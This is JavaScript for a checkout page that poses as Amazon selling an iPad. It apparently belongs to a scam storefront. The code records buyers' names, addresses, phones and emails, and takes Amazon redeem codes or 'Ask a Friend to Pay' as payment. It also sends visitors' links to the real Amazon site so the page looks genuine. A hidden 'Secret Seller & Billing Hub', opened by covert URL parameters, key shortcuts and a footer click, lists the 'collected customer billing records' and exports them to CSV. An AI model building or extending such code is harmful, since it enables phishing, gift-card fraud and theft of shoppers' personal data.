  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  };

  safeSet("confExpectedDelivery", deliveryInfo.fullRangeStr);
  safeSet("confOrderNumber", orderNumber);
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", fullItemTitle);
  safeSet("confQty", state.qty);
  safeSet("confTotal", (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? "$0.00 (Paid in Full)" : formatMoney(totalAmount));
  safeSet("confPayMethod", state.paymentMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const redeemBox = document.getElementById("confRedeemNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Ask a Friend to Pay") {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  } else if (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    safeSet("confPayMethod", `Redeem Code (${state.redeemCode || 'AMZN-CLAIM-CODE'})`);
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code";

    // Auto-trigger PDF download for redeem option
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(placedOrder);
      }
    }, 450);
  } else {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = `Status: ${state.paymentMethod} recorded`;
  }

  // Switch views smoothly
  const checkoutGrid = document.getElementById("checkoutGridArea");
  if (checkoutGrid) checkoutGrid.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  try { history.pushState({ view: "confirmation" }, "", "#confirmation"); } catch (e) {}

  updateOrdersBadge();
  if (typeof renderOrdersDrawer === "function") {
    renderOrdersDrawer();
  }

  showToast("Order placed successfully! Check your email for confirmation.");
}

// ==========================================================================
//  5. SLIDE-OUT CUSTOMER ORDERS DRAWER (ADMIN HUB / HIDDEN SELLER)
// ==========================================================================
function setupOrdersDrawer() {
  const drawer = document.getElementById("ordersDrawer");
  const backdrop = document.getElementById("drawerBackdrop");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const clearBtn = document.getElementById("btnClearAllOrders");
  const exportBtn = document.getElementById("btnExportOrdersCsv");
  const footerTrigger = document.getElementById("footerAdminTrigger");
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoiceModal = document.getElementById("btnCloseInvoiceModal");
  const continueShoppingBtn = document.getElementById("btnContinueShopping");

  function openDrawer() {
    renderOrdersDrawer();
    if (drawer) drawer.classList.add("open");
    if (backdrop) backdrop.classList.add("open");
  }

  function closeDrawer() {
    if (drawer) drawer.classList.remove("open");
    if (backdrop) backdrop.classList.remove("open");
  }

  // Covert Trigger 1: Secret URL Parameter (?admin=1, ?secret=1, ?orders=1, or ?seller=1)
  const urlQuery = new URLSearchParams(window.location.search);
  if (urlQuery.has("admin") || urlQuery.has("secret") || urlQuery.has("orders") || urlQuery.has("seller")) {
    setTimeout(() => {
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    }, 400);
  }

  // Covert Trigger 2: Secret Keyboard Shortcut (Alt + S, Alt + A, or Ctrl + Shift + S)
  window.addEventListener("keydown", (e) => {
    if ((e.altKey && e.key.toLowerCase() === "s") || 
        (e.altKey && e.key.toLowerCase() === "a") || 
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "s")) {
      e.preventDefault();
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    }
  });

  // Covert Trigger 3: Secret Gesture (Click footer Amazon.com brand text)
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    });
  }

  if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeDrawer);
  if (backdrop) backdrop.addEventListener("click", closeDrawer);

  if (continueShoppingBtn) {
    continueShoppingBtn.addEventListener("click", () => {
      window.location.href = "https://www.amazon.com";
    });
  }

  if (clearBtn) {
    clearBtn.addEventListener("click", async () => {
      if (confirm("Are you sure you want to clear all collected customer billing records?")) {
        localStorage.removeItem("amazon_placed_orders_ipad");
        await deleteOrdersFromAPI();
        renderOrdersDrawer();
        updateOrdersBadge();
        showToast("Records successfully cleared.");
      }
    });
  }

  if (exportBtn) {
    exportBtn.addEventListener("click", exportOrdersToCSV);
  }

  if (btnCloseInvoiceModal) {
    btnCloseInvoiceModal.addEventListener("click", () => {
      if (invoiceModal) invoiceModal.style.display = "none";
    });
  }

  const btnDownloadReceipt = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceipt) {
    btnDownloadReceipt.addEventListener("click", () => {
      if (state.placedOrder) {
        if (typeof window.downloadOrderInvoicePdf === "function") {
          window.downloadOrderInvoicePdf(state.placedOrder);
        } else if (typeof window.openInvoice === "function") {
          window.openInvoice(state.placedOrder);
        }
      }
    });
  }
}

async function renderOrdersDrawer() {
  const container = document.getElementById("ordersListContainer");
  if (!container) return;

  container.innerHTML = `<div style="text-align:center; padding:30px; color:#888; font-size:13px;">⏳ Loading orders...</div>`;

  const orders = await fetchOrdersFromAPI();

  if (orders.length === 0) {
    container.innerHTML = `
      <div style="text-align:center; padding:40px 20px; color:#666;">
        <div style="font-size:36px; margin-bottom:12px;">📦</div>
        <strong style="font-size:15px; color:#111; display:block; margin-bottom:6px;">No customer orders placed yet</strong>
        <p style="font-size:13px; color:#777; margin-bottom:16px;">
          When an order is submitted, customer delivery details will appear here.
        </p>
      </div>
    `;
    return;
  }

  container.innerHTML = orders.map((ord, idx) => `
    <div class="order-record-card">
      <div class="orc-top">
        <span>${ord.name || ord.fullName || ord.buyerName || 'Customer'}</span>
        <span style="color:var(--price-red); font-weight:700;">${ord.price || (ord.total !== undefined ? formatMoney(ord.total) : '')}</span>
      </div>
      <div class="orc-product">${ord.item || 'Apple iPad Pro (M5)'}</div>
      <div class="orc-details">
        <strong>Address:</strong> ${ord.address || ord.deliveryAddress || ord.shippingAddress || 'N/A'}<br>
        <strong>Phone:</strong> <a href="tel:${ord.phoneNumber || ord.phone || ''}" style="color:var(--link-color);">${ord.phoneNumber || ord.phone || 'N/A'}</a><br>
        <strong>Email:</strong> <a href="mailto:${ord.email || ''}" style="color:var(--link-color);">${ord.email || 'N/A'}</a>
      </div>
      <button class="btn-invoice" onclick="openInvoice(${idx})">
        🧾 Print Customer Statement
      </button>
    </div>
  `).join("");
}

// Open Printable Billing Invoice Modal
window.openInvoice = async function(indexOrId) {
  let ord = null;
  if (indexOrId && typeof indexOrId === 'object') {
    ord = indexOrId;
  } else {
    const orders = await fetchOrdersFromAPI();
    ord = (typeof indexOrId === 'number') ? orders[indexOrId] : (orders.find(o => o.orderId === indexOrId) || orders[0]);
  }
  if (!ord) return;

  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");
  if (typeof window.generateInvoiceHtml === "function") {
    content.innerHTML = window.generateInvoiceHtml(ord);
  }

  const btnDl = document.getElementById("btnModalDownloadPdf");
  if (btnDl) {
    btnDl.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(ord);
      }
    };
  }

  if (modal) modal.style.display = "flex";
};

// Export All Collected Orders to CSV File
async function exportOrdersToCSV() {
  const orders = await fetchOrdersFromAPI();
  if (orders.length === 0) {
    showToast("No records available to export.");
    return;
  }

  const headers = ["Name", "Address", "Phone Number", "Email", "Item", "Price"];
  const rows = orders.map(o => [
    `"${(o.name || o.fullName || o.buyerName || '').replace(/"/g, '""')}"`,
    `"${(o.address || o.deliveryAddress || o.shippingAddress || '').replace(/"/g, '""')}"`,
    `"${(o.phoneNumber || o.phone || '').replace(/"/g, '""')}"`,
    `"${(o.email || '').replace(/"/g, '""')}"`,
    `"${(o.item || '').replace(/"/g, '""')}"`,
    `"${(o.price || (o.total !== undefined ? formatMoney(o.total) : '')).replace(/"/g, '""')}"`
  ]);

  const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `ipad_orders_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showToast("CSV export downloaded successfully!");
}

// Update Header Orders Badge
function updateOrdersBadge() {
  try {
    const orders = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    const badge = document.getElementById("navOrdersBadge");
    if (badge) {
      if (orders.length > 0) {
        badge.textContent = `(${orders.length})`;
      } else {
        badge.textContent = "";
      }
    }
  } catch (e) {}
}

// Amazon Notification Toast
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  setTimeout(() => {
    toast.style.display = "none";
  }, 3200);
}

// ==========================================================================
//  6. AMAZON REDIRECTION FOR LOGO, MENU OPTIONS, SEARCH
// ==========================================================================
function setupAmazonRedirects() {
  const topSearchForm = document.getElementById("topSearchForm");
  if (topSearchForm) {
    topSearchForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const q = document.getElementById("topSearchInput")?.value.trim();
      if (q) {
        window.location.href = `https://www.amazon.com/s?k=${encodeURIComponent(q)}`;
      } else {
        window.location.href = "https://www.amazon.com";
      }
    });
  }

  // Intercept other menu links, nav items, and category links to redirect to Amazon
  const redirectLinks = document.querySelectorAll(".sub-link, .nav-item[href]:not(#navOrdersBtn), .nav-location[href], .brand-link, .breadcrumb-bar a");
  redirectLinks.forEach((link) => {
    if (link.id === "navOrdersBtn" || link.closest("#ordersDrawer")) return;
    link.addEventListener("click", (e) => {
      const dest = link.getAttribute("href");
      if (dest && dest.startsWith("http")) {
        e.preventDefault();
        window.location.href = dest;
      }
    });
  });
}

// ==========================================================================
//  7. LANGUAGE SWITCHER & AUTO-TRANSLATION
// ==========================================================================
function setupLanguageSwitcher() {
  const navLangBtn = document.getElementById("navLangBtn");
  const navCurrentLangText = document.getElementById("navCurrentLangText");
  const langItems = document.querySelectorAll("#langSelectList li");

  const LANG_LABELS = {
    en: "EN",
    tl: "TL",
    es: "ES",
    fr: "FR",
    de: "DE",
    it: "IT",
    pt: "PT",
    ar: "AR",
    ja: "JA",
    ko: "KO",
    "zh-CN": "ZH",
    hi: "HI",
    vi: "VI",
    id: "ID"
  };

  function getActiveLang() {
    const match = document.cookie.match(/googtrans=\/en\/([^;]+)/);
    if (match && match[1]) return match[1];
    const saved = localStorage.getItem("amazon_preferred_lang");
    if (saved) return saved;
    return "en";
  }

  function setLanguage(langCode) {
    localStorage.setItem("amazon_translation_decided", "true");
    localStorage.setItem("amazon_preferred_lang", langCode);

    if (langCode === "en") {
      document.cookie = "googtrans=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      document.cookie = "googtrans=; expires=Thu, 01 Jan 1970 00:00:00 UTC; domain=" + location.hostname + "; path=/;";
    } else {
      document.cookie = "googtrans=/en/" + langCode + "; path=/";
      document.cookie = "googtrans=/en/" + langCode + "; domain=" + location.hostname + "; path=/";
    }

    if (navCurrentLangText && LANG_LABELS[langCode]) {
      navCurrentLangText.textContent = LANG_LABELS[langCode];
    }
    window.location.reload();
  }

  if (navLangBtn) {
    navLangBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      const dropdown = document.getElementById("langDropdown");
      if (dropdown) dropdown.classList.toggle("open");
    });
  }

  document.addEventListener("click", () => {
    const dropdown = document.getElementById("langDropdown");
    if (dropdown) dropdown.classList.remove("open");
  });

  langItems.forEach(item => {
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      const lang = item.getAttribute("data-lang");
      if (lang) setLanguage(lang);
    });
  });

  const cur = getActiveLang();
  if (navCurrentLangText && LANG_LABELS[cur]) {
    navCurrentLangText.textContent = LANG_LABELS[cur];
  }
}

// ==========================================================================
//  INITIALIZATION
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  setupProductOptions();
  setupBuyNow();
  setupCheckoutAccordion();
  setupOrdersDrawer();
  setupAmazonRedirects();
  setupLanguageSwitcher();
  updateOrdersBadge();
});
